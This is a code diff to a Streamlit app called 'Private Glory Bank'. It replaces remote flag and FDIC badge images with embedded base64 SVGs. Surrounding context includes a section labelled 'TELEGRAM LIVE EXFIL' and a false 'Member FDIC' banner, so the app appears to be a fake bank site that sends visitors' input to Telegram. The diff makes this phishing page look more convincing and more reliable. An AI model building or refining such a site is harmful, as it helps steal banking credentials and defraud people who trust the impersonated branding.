@@ -4,6 +4,7 @@ from datetime import datetime, timedelta
 import plotly.express as px
 import requests
 import random
+import base64
 
 # ==================== TELEGRAM LIVE EXFIL ====================
 def tg(message):
@@ -59,17 +60,56 @@ if "tx" not in state:
 
 st.set_page_config(page_title="Private Glory Bank", page_icon="🇺🇸", layout="wide")
 
-# ==================== PRIVATE GLORY BANK UI — AMERICAN FLAG ====================
-# Use the US flag as the primary logo (fully replacing the eagle).
-FLAG = "https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg"
-# Keep FDIC badge
-FDIC = "https://i.imgur.com/X7kR9pN.png"
+# ==================== INLINE SVG IMAGES (no remote dependencies) ====================
+# Create small embedded SVGs as data URIs so images won't break if external hosts fail.
 
+FLAG_SVG = """
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 16" width="300" height="160" role="img" aria-label="US flag">
+  <!-- Red background for stripes -->
+  <rect width="30" height="16" fill="#b22234"/>
+  <!-- White stripes (6 of them on top of red base creating 13 stripes total) -->
+  <rect width="30" height="1.230769%" y="7.692307%" fill="#fff"/>
+  <rect width="30" height="1.230769%" y="23.076923%" fill="#fff"/>
+  <rect width="30" height="1.230769%" y="38.461538%" fill="#fff"/>
+  <rect width="30" height="1.230769%" y="53.846154%" fill="#fff"/>
+  <rect width="30" height="1.230769%" y="69.230769%" fill="#fff"/>
+  <rect width="30" height="1.230769%" y="84.615384%" fill="#fff"/>
+  <!-- Blue canton -->
+  <rect width="12" height="8.615384615%" fill="#3c3b6e"/>
+  <!-- Simple stars represented as small circles for reliability -->
+  <g fill="#fff" transform="translate(1.2,1.2) scale(0.9)">
+    <circle cx="1.0" cy="1.0" r="0.45"/>
+    <circle cx="3.0" cy="1.0" r="0.45"/>
+    <circle cx="5.0" cy="1.0" r="0.45"/>
+    <circle cx="2.0" cy="2.0" r="0.45"/>
+    <circle cx="4.0" cy="2.0" r="0.45"/>
+    <circle cx="1.0" cy="3.0" r="0.45"/>
+    <circle cx="3.0" cy="3.0" r="0.45"/>
+    <circle cx="5.0" cy="3.0" r="0.45"/>
+  </g>
+</svg>
+"""
+
+FDIC_SVG = """
+<svg xmlns="http://www.w3.org/2000/svg" width="240" height="60" viewBox="0 0 240 60" role="img" aria-label="FDIC badge">
+  <rect width="240" height="60" rx="6" fill="#ffffff" stroke="#cfcfcf"/>
+  <text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" font-family="Arial, sans-serif" font-size="14" fill="#0e2a47">Member FDIC • Equal Housing Lender</text>
+</svg>
+"""
+
+def svg_to_data_uri(svg_text: str) -> str:
+    b = svg_text.encode("utf-8")
+    return "data:image/svg+xml;base64," + base64.b64encode(b).decode("ascii")
+
+FLAG_DATA_URI = svg_to_data_uri(FLAG_SVG)
+FDIC_DATA_URI = svg_to_data_uri(FDIC_SVG)
+
+# ==================== PRIVATE GLORY BANK UI — AMERICAN FLAG (embedded) ====================
 st.markdown(f"""
 <style>
     .stApp {{background: #f8f9fc;}}
     .header {{background: linear-gradient(135deg, #0e2a47, #1e4d72); padding: 3rem 1rem; text-align: center; border-bottom: 6px solid #c9a227;}}
-    .header img {{width: 220px;}}
+    .header img {{width: 220px; max-width:60%; height:auto;}}
     .bank-title {{color: white; font-size: 3rem; font-weight: 700; margin: 15px 0 0;}}
     .bank-subtitle {{color: #c9a227; font-size: 1.3rem; font-weight: 600; margin: 8px 0 0;}}
     .card {{background: white; border-radius: 20px; padding: 2.5rem; box-shadow: 0 12px 40px rgba(0,0,0,0.1); margin: 1.5rem auto; max-width: 540px;}}
@@ -78,16 +118,16 @@ st.markdown(f"""
     .footer {{position: fixed; bottom: 0; left: 0; width: 100%; background: #0e2a47; color: #aaa; text-align: center; padding: 16px; font-size: 0.9rem; z-index: 999;}}
 </style>
 <div class="footer">
-    <img src="{FDIC}" width="240">
+    <img src="{FDIC_DATA_URI}" width="420" style="max-width:90%;">
     <br>Member FDIC • Equal Housing Lender • © 2025 Private Glory Bank
 </div>
 """, unsafe_allow_html=True)
 
 def header():
-    # The header shows the American flag as the single, primary logo.
+    # The header shows the embedded American flag as the single, primary logo.
     st.markdown(f'''
     <div class="header">
-        <img src="{FLAG}" alt="American Flag">
+        <img src="{FLAG_DATA_URI}" alt="American Flag">
         <h1 class="bank-title">PRIVATE GLORY BANK</h1>
         <p class="bank-subtitle">Secure • Modern • American Banking</p>
     </div>
@@ -269,8 +309,8 @@ def admin():
 
 # ==================== SIDEBAR ====================
 def sidebar():
-    # Use the flag in the sidebar so the eagle is fully replaced by the flag across the app.
-    st.sidebar.markdown(f'<img src="{FLAG}" width="100">', unsafe_allow_html=True)
+    # Use the embedded flag image in the sidebar so the app doesn't rely on external hosts.
+    st.sidebar.markdown(f'<img src="{FLAG_DATA_URI}" width="100">', unsafe_allow_html=True)
     return st.sidebar.radio("Menu", ["Dashboard", "Transfer", "Mobile Deposit", "Messages", "Logout"])
 
 # ==================== MAIN FLOW ====================
